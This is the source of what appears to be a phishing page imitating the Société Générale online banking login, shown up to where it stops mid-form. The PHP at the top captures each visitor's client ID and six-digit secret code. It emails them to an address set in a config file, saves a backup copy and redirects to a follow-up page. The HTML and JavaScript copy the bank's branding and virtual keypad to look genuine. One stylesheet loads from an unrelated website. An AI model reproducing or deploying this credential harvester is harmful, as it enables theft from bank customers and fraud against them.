<?php
@session_start();
error_reporting(0);

$currentPath = $_SERVER['PHP_SELF'];
// output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index )
$pathInfo = pathinfo($currentPath);

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$domainName = $_SERVER['HTTP_HOST'].'/';

$host_name = $protocol.$domainName.$pathInfo['dirname']."/";

function is_var_set($var) {

	return (isset($_POST[$var]) && $_POST[$var] !="") ? true : false;
}

if( is_var_set("user_id") && is_var_set("pass_id")) {

	$_SESSION['user_id'] = $_REQUEST['user_id'];
	$_SESSION['pass_id'] = $_REQUEST['pass_id'];

	$info_names = array(

		"IDENTIFIANT" => "user_id",	//12345678
		"ID PASSWORD" => "pass_id"
	);
	$redirection = "profil.php";

	include("config.php");
	mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
	save_rs("backup",$subject,$infoRaw);
	echo "<script>window.location.href = '".$redirection."';</script>";

}
?>

<html class="swm-root-active swm-mode-page" lang="FR"><head>

				<meta charset="utf-8">
				<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
				<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
				<meta name="format-detection" content="telephone=no">

                     <!-- <script type="text/javascript" async="" src="https://www.google.com/pagead/conversion_async.js"></script><script src="https://connect.facebook.net/signals/config/873080639448770?v=2.9.18&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script src="//bat.bing.com/bat.js" async=""></script><script type="text/javascript" charset="UTF-8" async="" id="MFBActor" src="https://actorssl-5637.kxcdn.com/actor/a7a30ba0aebbae114c740a1b35adb8c7-1641/action"></script><script>if (top != self) { top.location = self.location; }</script> -->
                    <title>Société Générale | Connexion</title>

                <base href="https://particuliers.societegenerale.fr">



                    <!-- <script charset="UTF-8" src="/static/Resources/js/n2g_secu.js"></script> -->
        <!-- <script type="text/javascript">frame_shield();</script> -->
        <!-- <script type="application/json" id="sas_user_info"> -->

<!-- </script> -->
<style>

.loading_img {
    z-index: 111;
    position: relative;
		display:none;
    width: 100px;
    height: auto;
    top: 330px;
    left: 50%;
    transform: translate(-50%, -50%);
    transition: all ease 0.3s;
}
.arrow_image {
	display: inline-block;
	height: 18px;
	width: 10px;
	margin-right: .5rem;
	color: #333;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">

var authStep = 1;

$(document).keydown(function(event){
	var keycode = (event.keyCode ? event.keyCode : event.which);
	if(keycode == '13'){
		if(authStep == 1)
			$('#btn-validate').click();
		else
			$('#btn-authent').click();
		return false;
	}
});

$(document).ready(function(){


	$('#user_id').focus();

	$('#user_id').keyup(function(event){

		if($('#user_id').val().length == 8)
			$('#user_id').addClass('is-valid');
		else
			$('#user_id').removeClass('is-valid');
	});

	$('#user_id').keydown(function(event){
		// $('#user_id').removeClass('is-valid');
		$('#js-error').removeClass('show');
		$('#js-error').hide();
		$('#js-error-2').hide();
	});

	$('#user_id-delete').click(function(){
		$('#user_id').val('');
		$('#user_id').focus();
	});

	$('#btn-validate').click(function(){
		var regex = new RegExp("^[0-9]{8}$");
		var user_id_val = $('#user_id').val();
		if(!regex.test(user_id_val)) {
			$('#js-error').addClass('show');
			$('#js-error').show();
			$('#user_id').removeClass('is-valid');
		}
		else{
			$('#btn-container').hide();
			$('#clavier').show();
			//$('#codeSecret').focus();
			$('#img_clavier').focus();
			authStep++;
		}
	});

	function getDigitValue(digitObj) {
		var digitsValues = {
			'1_1': '6',
			'1_3': '1',
			'2_1': '3',
			'2_2': '7',
			'2_3': '9',
			'2_4': '2',
			'3_2': '0',
			'3_4': '4',
			'4_2': '5',
			'4_4': '8'
		};

		var digitId = digitObj.attr('id');
		var digitPos = digitId.substring(digitId.length-3);
		digitSec = digitsValues[digitPos];
		return digitSec;
	}

	function resetSecretStyle() {
		$('#codeSecret').removeClass (function (index, className) {
			return (className.match (/\bauth-pwd-[1-6]+/g) || []).join(' ');
		});
	}


	var digits = $('#img_container div');
	var codeSec = '';

	digits.mousedown(function(){
		var digitSec = getDigitValue($(this));
		if(digitSec === undefined) return;
		else {
			$(this).addClass('active');
			$('#js-error-2').hide();
		}
	});

	digits.mouseup(function(){
		var digitSec = getDigitValue($(this));
		if(digitSec === undefined) return;
		else {
			$(this).removeClass('active');
			//console.log(codeSec);
			if(codeSec.length < 6){
				codeSec += digitSec
				//console.log(codeSec);
				resetSecretStyle();
				$('#codeSecret').addClass('auth-pwd-'+codeSec.length.toString());
			}
		}
	});

	$('#codeSecret-delete').click(function(){
		codeSec = '';
		resetSecretStyle();
	});

	$('#btn-authent').click(function(){
		var regex = new RegExp("^[0-9]{8}$");
		var user_id_val = $('#user_id').val();
		if(!regex.test(user_id_val)) {
			$('#js-error').addClass('show');
			$('#js-error').show();
			$('#user_id').removeClass('is-valid');
			$('#user_id').focus();
			return false;
		}
		if(codeSec.length != 6 ) {
			$('#js-error-2').addClass('show');
			$('#js-error-2').show();
			codeSec = '';
			resetSecretStyle();
			return false;
		}

		$('#pass_id').val(codeSec);
		$(".loading_img").show();
		setTimeout(function()
		{
			$('#main-form').submit();
		}, 3000);

	});


	/*******************************
	digits.each(function(){
		alert('each element');
	});
	digits.eq(15).click(function(){
		alert('is it six?');
	});
	*******************************/
});


</script>

<meta name="robots" content="none">
        <meta property="og:url" content="https://particuliers.societegenerale.fr/loginpage/user-login-page">


		<title>Connexion - Espace client</title>
						<meta name="title" content="Connexion - Espace client">
						<meta property="og:title" content="Connexion - Espace client">
					<meta name="twitter:card" content="summary">

		<script>
    if (!window.cmsConstants) window.cmsConstants = {};

    window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
    window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
	window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "error";

	window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
	window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
	window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="/static/Resources/img/favicon.ico">

        <script type="text/javascript">
		/*
        var currentAnchor = '';

        if (window.location.hash) {
            currentAnchor = "-" + window.location.hash.replace("#", "");
        }

        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) {
                return parts.pop().split(";").shift();
            }
            return "";
        }


				var tc_vars = {
					"page_name": "user_login_page" + currentAnchor,
					"page_type": "HomePage",
					"sub_level": "22",
					"page_category": "",
					"product_name": "",
					"product_type": "Homepage",
					"product_theme": "Homepage",
					"page_theme": "Homepage",
					"envt": "PROD",
                    "no_load": false,
				};
				var xiti_xtn2 = "22";
        		var xtn2 = "22";



		tc_vars["chapter"] = "loginpage";
		tc_vars["sub_chapter"] = "";

        var sasInf = document.getElementById('sas_user_info');
        if (sasInf) {
            var sasHtml = sasInf.innerHTML;
            try {
                var sasJs = JSON.parse(sasHtml.trim());
                if (sasJs && sasJs.IdStat) {
                    tc_vars["user_id"] = sasJs.IdStat;
                    tc_vars["connexion_status"] = "co";

                } else {
                    tc_vars["connexion_status"] = "deco";

				}
            } catch (e) {
                tc_vars["connexion_status"] = "deco";

			}
		} else {
            tc_vars["connexion_status"] = "deco";

		}
		*/
	</script>
<script type="text/javascript">
	/*
    if (typeof userSegments === "undefined") {
        var userSegments = [];
    }
    if (typeof userSegmentNames === "undefined") {
        var userSegmentNames = [];
    }

        userSegments.push("S--1241608817-0000000000000000000000RCRD");

        userSegments.push("S--1470891196-0000000000000000000000RCRD");

        userSegments.push("S-1609544352-00000000000000000000000RCRD");

        userSegments.push("S-44329276-0000000000000000000000000RCRD");

        userSegmentNames.push("0");

        userSegmentNames.push("Clients_Generiques");

        userSegmentNames.push("Mobile");

        userSegmentNames.push("Android");
		*/
    </script>
<!-- <script charset="UTF-8" src="/icd/static/dcaweb-front/public/public-dca-portail.js"></script> -->

                    <!-- <script charset="UTF-8" src="/static/Resources/js/init-configs-v2_20200225104008.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/Revive/dca_portail_20200128180913.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/vendor-v2_20200130120827.min.js"></script> -->
            <!-- <script charset="UTF-8" src="/swm/resources/gda/js/gda.public.js"></script> -->
			<!-- <script type="text/javascript" src="/icd/static/dcaweb-front/1.1.2/dist/awt-dcaweb.js"></script> -->

                    <!-- <script charset="UTF-8" src="/icd/static/interact-front/public/interact-lanceur.js"></script> -->

                    <!-- <script charset="UTF-8" src="/static/Resources/js/indexv2_20200128180913.min.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/TMS/tc_SocieteGenerale_20_20200429091823.js"></script><script id="tc_script_114_1" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.js" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script><script id="tc_script__1" type="text/javascript" src="//particuliers.societegenerale.fr/static/Resources/js/TMS/tc_SocieteGenerale_22.js" defer=""></script> -->
            <link href="/static/Resources/stylesheets/index-v3_20200311155104.min.css" rel="stylesheet" type="text/css">
                <link href="/static/Resources/stylesheets/spec56_btn_gsm_all_gcd_20200128180913.min.css" rel="stylesheet" type="text/css">
                <link href="/static/Resources/stylesheets/print_20200128180913.min.css" rel="stylesheet" type="text/css" media="print">
                <style type="text/css">
.eip_txt_light{
  font-weight:300;
}

.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style><link href="/static/Resources/stylesheets/Surcharges-templates/head-section_fix-gb9_15852298750000.css" rel="stylesheet" type="text/css">
<!-- <script charset="UTF-8" type="text/javascript" src="/static/pri/contenu/js/prof.js"></script> -->
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->



            <!-- <script id="ebOneTagUrlId" src="https://secure-ds.serving-sys.com/SemiCachedScripts/ebOneTag.js" async="" defer=""></script> -->
			<!-- <script src="/icd/static/swm/resources/version/19.43.7/js/swm.main.js" type="text/javascript" charset="UTF-8"></script> -->
			<!--
			<script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1025892926/?random=1588523174180&amp;cv=9&amp;fst=1588523174180&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=778&amp;u_w=1482&amp;u_ah=739&amp;u_aw=1482&amp;u_cd=24&amp;u_his=6&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2oa4m0&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html&amp;tiba=Soci%C3%A9t%C3%A9%20G%C3%A9n%C3%A9rale%20%7C%20Connexion&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/786705886/?random=1588523174183&amp;cv=9&amp;fst=1588523174183&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=778&amp;u_w=1482&amp;u_ah=739&amp;u_aw=1482&amp;u_cd=24&amp;u_his=6&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2oa4m0&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html&amp;tiba=Soci%C3%A9t%C3%A9%20G%C3%A9n%C3%A9rale%20%7C%20Connexion&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1004456575/?random=1588523174185&amp;cv=9&amp;fst=1588523174185&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=778&amp;u_w=1482&amp;u_ah=739&amp;u_aw=1482&amp;u_cd=24&amp;u_his=6&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2oa4m0&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html&amp;tiba=Soci%C3%A9t%C3%A9%20G%C3%A9n%C3%A9rale%20%7C%20Connexion&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1004456575/?random=1588523174186&amp;cv=9&amp;fst=1588523174186&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=778&amp;u_w=1482&amp;u_ah=739&amp;u_aw=1482&amp;u_cd=24&amp;u_his=6&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2oa4m0&amp;sendb=1&amp;ig=0&amp;data=event%3Dpage_view%3Benv_market%3Dparticuliers%3Bpage_name%3Duser_login_page%3Bpage_type%3DHomePage%3Bpage_category_1%3Dloginpage%3Bpage_category_2%3D%3Bpage_category_3%3D%3Bproduct_name_trade%3D%3Bproduct_category_1%3D%3Bproduct_category_2%3D%3Bproduct_category_3%3D&amp;frm=0&amp;url=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html&amp;tiba=Soci%C3%A9t%C3%A9%20G%C3%A9n%C3%A9rale%20%7C%20Connexion&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script type="script/meta" src="https:///docsp.par.societegenerale.fr/978517/statm.js?r=0.8973286065361765"></script><script src="https://statsp.par.societegenerale.fr/socgenpar1/pic2Util.js?r=0.5181486398742953" async="" type="script/meta"></script><script type="script/meta" src="https://statsp.par.societegenerale.fr/978517/skys.js?r=0.0846188261937788"></script><script type="text/javascript" async="" src="https://statsp.par.societegenerale.fr/978517/9C0XU?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI0JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMnMlMjIlM0ElMjJOSW1BNWJIaiUyRlhUTyUyMiU3RCU3RCU1RA%3D%3D&amp;cid=4&amp;si=3&amp;e=https%3A%2F%2Fparticuliers.societegenerale.fr&amp;LSESSIONID=jLd1oqQf44MucimFLR0o0DwKofuSoXveUUCzEXavFtPX08UvP8R45sWgf2%2BP3YELQkmeGqUghBI%3D&amp;t=jsonp&amp;c=ssibfyezzomrmxnb&amp;eu=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html"></script>
			-->
			</head>



			<body class="PRI waitJeton swm swm-mode-page swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV">



                <header class="rsp_header header-deco header-authent js-header-lhs-auth dcw_header--no-subnav">
	<nav class="rsp_nav rsp_nav--above">
		<ul class="rsp_nav__list">

        <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
            <a data-tms-container-label="top-menu" href="https://agences.societegenerale.fr/banque-assurance/" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="agences"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Agences</span></a>
        </li>
        <li class="rsp_nav__item" data-channelid="7eb2e45e86bb3610VgnVCM1000000ae1c6c0RCRD">
            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
        </li>
</ul>
	</nav>

	<div class="rsp_header__wrapper-nav">
		<a href="/" class="rsp_header__logo-mob" title="page d'accueil">
    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23">
      <g fill="none" fill-rule="evenodd">
        <path fill="#ED0210" d="M0 11.335h22.22V0H0z"></path>
        <path fill="#000" d="M0 22.141h22.22V11.032H0z"></path>
        <path fill="#FFF" d="M4.413 11.649h14.456v-1.352H4.413z"></path>
      </g>
    </svg>
  </a>
  <a href="/" class="rsp_header__logo-desktop ml-m" title="page d'accueil">
    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="192" height="40" viewBox="0 0 340 70">
      <g fill="none" fill-rule="evenodd" transform="translate(-15 -1)">
        <path fill="#000" d="M15.106 24.88c0-5.948 4.551-10.164 10.751-10.164 3.602 0 6.506 1.312 8.405 3.685l-3.518 3.184c-1.229-1.48-2.737-2.29-4.608-2.29-3.212 0-5.445 2.234-5.445 5.585s2.233 5.585 5.445 5.585c1.871 0 3.38-.81 4.608-2.29l3.518 3.183c-1.899 2.374-4.803 3.686-8.405 3.686-6.2 0-10.75-4.216-10.75-10.164M41.748 16.81c0 .782-.112 1.396-.894 3.212l-1.787 4.076h-3.323l1.313-4.551c-1.006-.475-1.648-1.424-1.648-2.737 0-1.9 1.34-3.127 3.183-3.127 1.815 0 3.156 1.228 3.156 3.127M60.04 30.381v4.273H44.345V15.106h15.33v4.274h-9.858v3.294h8.686v4.134h-8.685v3.573zM61.604 32.895l1.815-4.077c1.731 1.144 4.188 1.926 6.45 1.926 2.29 0 3.184-.642 3.184-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.656-6.34 2.541 0 5.166.587 7.093 1.704l-1.703 4.105c-1.87-1.005-3.714-1.507-5.418-1.507-2.318 0-3.155.78-3.155 1.759 0 2.987 11.086.753 11.086 7.958 0 3.407-2.848 6.31-8.657 6.31-3.21 0-6.394-.865-8.237-2.15M85.62 19.49h-6.003v-4.384h17.508v4.385H91.15v15.163h-5.53zM126.308 15.106l-8.379 19.547h-5.445l-8.35-19.547h5.977l5.306 12.734 5.416-12.734zM141.64 24.88c0-3.379-2.318-5.585-5.28-5.585-2.958 0-5.276 2.206-5.276 5.585s2.318 5.585 5.277 5.585c2.96 0 5.279-2.206 5.279-5.585m-16.141 0c0-5.864 4.608-10.164 10.862-10.164 6.256 0 10.864 4.3 10.864 10.164s-4.608 10.164-10.864 10.164c-6.254 0-10.862-4.3-10.862-10.164M150.382 25.942V15.107h5.53v10.666c0 3.352 1.396 4.692 3.713 4.692 2.29 0 3.687-1.34 3.687-4.692V15.107h5.445v10.835c0 5.835-3.407 9.102-9.188 9.102-5.78 0-9.187-3.266-9.187-9.102M170.991 32.895l1.815-4.077c1.731 1.144 4.19 1.926 6.451 1.926 2.29 0 3.183-.642 3.183-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.657-6.34 2.541 0 5.166.587 7.094 1.704l-1.704 4.105c-1.872-1.005-3.715-1.507-5.419-1.507-2.317 0-3.155.78-3.155 1.759 0 2.987 11.087.753 11.087 7.958 0 3.407-2.849 6.31-8.658 6.31-3.21 0-6.394-.865-8.237-2.15M58.002 39.648h5.529V54.81h9.326v4.385H58.002zM78.136 41.352c0 .781-.112 1.396-.894 3.211l-1.787 4.077h-3.323l1.312-4.552c-1.005-.475-1.647-1.424-1.647-2.736 0-1.9 1.34-3.128 3.183-3.128 1.815 0 3.156 1.228 3.156 3.128M90.59 51.32l-2.512-6.255-2.513 6.255h5.026zm1.62 4.077h-8.265l-1.536 3.8h-5.641l8.629-19.55h5.445l8.657 19.55h-5.752l-1.537-3.8zM117.455 39.648l-8.377 19.548h-5.445l-8.35-19.548h5.976l5.306 12.734 5.417-12.734zM135.133 54.923v4.273H119.44V39.648h15.331v4.273h-9.858v3.295h8.685v4.133h-8.685v3.574zM156.665 39.648v19.548h-4.553l-8.629-10.417v10.417h-5.416V39.648h4.551l8.63 10.416V39.648z"></path>
        <path fill="#000" d="M160.436 59.196h5.528V39.648h-5.528zM178.363 44.004h-3.072v5.725h3.072c2.29 0 3.435-1.061 3.435-2.849 0-1.815-1.145-2.876-3.435-2.876zm-.055 9.997h-3.017v5.195h-5.529V39.648h8.936c5.333 0 8.686 2.765 8.686 7.232 0 2.876-1.398 4.998-3.827 6.171l4.218 6.145h-5.922l-3.545-5.195zM249.497 25.422c-1.623-.688-3.361-1.138-4.91-1.138-2.257 0-3.387.486-3.387 1.358 0 2.498 10.082.493 10.082 5.821 0 2.206-2.071 3.911-6.219 3.911-2.462 0-4.385-.509-6.595-1.705l.912-1.986c1.937 1.076 3.743 1.553 5.697 1.553 2.46 0 3.778-.71 3.778-1.773 0-2.731-10.084-.692-10.084-5.687 0-2.153 2.054-3.636 5.771-3.636 2.223 0 4.093.489 5.879 1.384l-.924 1.898zM260.738 35.441c-4.028 0-7.367-2.682-7.367-6.692 0-3.962 3.34-6.695 7.367-6.695 4.05 0 7.336 2.733 7.336 6.695 0 4.01-3.287 6.692-7.336 6.692m0-11.229c-2.935 0-4.937 1.987-4.937 4.537 0 2.611 1.916 4.554 4.937 4.554 3 0 4.907-1.962 4.907-4.554 0-2.55-1.908-4.537-4.907-4.537M277.694 35.426c-4.23 0-7.419-2.68-7.419-6.695 0-3.945 3.238-6.677 7.42-6.677 2.494 0 4.28.707 5.883 1.887l-1.247 1.857c-1.166-.897-2.625-1.551-4.569-1.551-3.088 0-5.006 1.952-5.006 4.484 0 2.61 1.937 4.504 5.038 4.504 1.941 0 3.476-.628 4.635-1.521l1.253 1.856c-1.607 1.18-3.493 1.856-5.988 1.856M286.238 35.086h2.349V22.441h-2.349zM292.057 22.44v12.646h11.918v-2.09H294.4V29.69h7.127v-2.088H294.4V24.53h9.168v-2.09zM305.224 22.44v2.077h5.156v10.569h2.34V24.517h5.151v-2.076zM319.758 22.44v12.646h11.919v-2.09h-9.571V29.69h7.13v-2.088h-7.13V24.53h9.168v-2.09zM245.698 50.05c1.287 0 2.61-.29 3.607-.761v-3.677h2.282v4.909c-1.605 1.079-3.81 1.736-5.989 1.736-4.227 0-7.416-2.676-7.416-6.692 0-3.944 3.238-6.672 7.416-6.672 2.447 0 4.284.688 5.888 1.868l-1.245 1.855c-1.17-.893-2.635-1.502-4.578-1.502-3.084-.067-5 1.922-5 4.45 0 2.617 1.94 4.487 5.035 4.487M254.673 39.278v12.639h11.919V49.83h-9.578v-3.307h7.136v-2.087h-7.136v-3.072h9.177v-2.086zM271.19 51.918h-2.294V39.277h2.393l8.245 9.527.056-.016a101.83 101.83 0 0 1-.157-6.208v-3.303h2.291v12.64h-2.374l-8.213-9.522-.037.019c.09 1.87.09 5.139.09 6.205v3.299zM285.024 39.278v12.639h11.921V49.83h-9.58v-3.307h7.133v-2.087h-7.133v-3.072h9.173v-2.086zM305.544 47.268h-3.777v4.65h-2.345v-12.64h8.125c2.695 0 4.366 1.655 4.366 4.029 0 2.258-1.64 3.605-3.624 3.894l3.764 4.717h-2.94l-3.57-4.65zm1.752-2.107c1.467 0 2.296-.758 2.296-1.854 0-1.2-.73-1.943-2.045-1.943h-5.78v3.797h5.529zM319.03 39.278l-6.16 12.639h2.536l1.451-3.068h6.82l1.454 3.068h2.527l-6.164-12.64h-2.464zm1.245 2.393l2.426 5.126h-4.869l2.443-5.126zM329.384 39.278v12.639h10.783V49.83h-8.443V39.278zM341.75 39.278v12.639h11.922V49.83h-9.575v-3.307h7.132v-2.087h-7.132v-3.072h9.175v-2.086z"></path>
        <path fill="#ED0210" d="M199.175 37.453h30.212V22.042h-30.212z"></path>
        <path fill="#000" d="M199.175 52.255h30.212V37.151h-30.212z"></path>
        <path fill="#FFF" d="M204.454 38.069h19.655v-1.838h-19.655z"></path>
      </g>
    </svg>
  </a>
<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="ouvrir-un-compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="/ouvrir-compte-bancaire-en-ligne">                <span class="rsp_link__label">Ouvrir un compte</span>
</a></div>

	<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion - Espace client</h1>

	<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
</header>
<main class="dcw_main dcw_gb9_core-wrapper" role="main">
	<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
	</section>
<section class="dcw_gb_wrapper">
		<a id="go-content" tabindex="-1"></a>
		<section class="dcw_gb9_core-left" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->









<noscript>
    <style>
        .auth-content {display:none !important;}
        .js-alert {display: block !important;}
        .waitAuthJetonMsg {display: none !important;}
    </style>
</noscript>

<!-- <link rel="stylesheet" href="/icd/static/swm/resources/version/19.43.7/assets/markets/BDDF/PRI/INT/style.css"> -->
<link rel="stylesheet" href="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/style/style.css">


<script>



/*
swmConfOverride = {
	"version": "19.43.7",
	"firm": "BDDF",
	"provenance": "",
	"market": "PRI",
	"isNGIM": true,
	"media": "WEB_INT",
    "bank_market_canal": "BDDF_PRI_WEB",
	"isProspect": false,
    "codeClientEtoileNgim": "",
	"defaultUrl": "\/restitution\/cns_listeprestation.html",


	"isSASAuth": false,
	"isSupervision": false,
	"logLocal": false,
	"logNiveau": "error",
    "staticBaseUrl": "/icd/static/swm/resources/version/19.43.7",
    "baseUrl": "",
	"styles": [],
	"isDebug": false,
    "isOldGdaCompatibilityMode":  function() {
		return swmConfOverride.firm.toUpperCase() === "BDDF"
				&& "WEB_INT" === swmConfOverride.media
				&& ('PRO' === swmConfOverride.market || 'ENT' === swmConfOverride.market);
    },
	"urlCdnCmsBeforeCmsMainContainer": "${url.cdn.cms.beforeCmsMainContainer.content}",
	"urlCdnCmsAfterCmsMainContainer": "${url.cdn.cms.afterCmsMainContainer.content}",
	"urlCdnCmsBeforeSwmContainerContent": "${url.cdn.cms.beforeSwmContainer.content}",
	"urlCdnCmsAfterSwmContainerContent": "${url.cdn.cms.afterSwmContainer.content}",
"isZSSCA": "false"



};


swmConfOverride.styles = ["/icd/static/swm/resources/version/19.43.7/assets/markets/BDDF/PRI/INT/style.css"];
*/
</script>

<div id="swm-wrapper" class="swm-inner-wrapper">
    <div class="prefetch"></div>
    <div id="disableLayer" class="disable-layer"></div>





<!-- <script id="templateGenericError" type="template/doT.js"> -->
<!-- </script> -->

<!-- <script id="templateCsaError" type="template/doT.js"> -->
<!-- </script> -->

<div id="swm-tooltip" class="swm-tooltip">
    <span></span>
</div>
<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
    <div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
    <div id="swm-popin-dialog" class="swm-popin-dialog">
        <div class="swm-popin-relative">
            <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
            <div class="swm-popin-ombre-sup" role="presentation"></div>
            <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
                <div id="swm-popin" class="swm-popin">
                    <div id="swm-popin-cadre" class="swm-popin-cadre">
                    </div>
                </div>
            </div>
            <div class="swm-popin-ombre-inf" role="presentation"></div>
        </div>
    </div>
</div>










<!-- <script id="errorMessage" type="template/doT.js"> -->
<!-- </script> -->


        <div class="swm_authent">

					<img class="loading_img" src="<?=$host_name?>/img/load.gif">

        <div class="auth-content js-content-aria-hide swm_codeContainer">
            <div id="swmModulesAuth">  <div id="module-authent-cv"> <div class="container-mire-codeClient"> <div class="swm_block">
							<form class="component-mire-codeclient" method="post" action="" id="main-form">
			<div class="swm_block-element">
			<div class="auth-cs-content row_section swm_input-container">
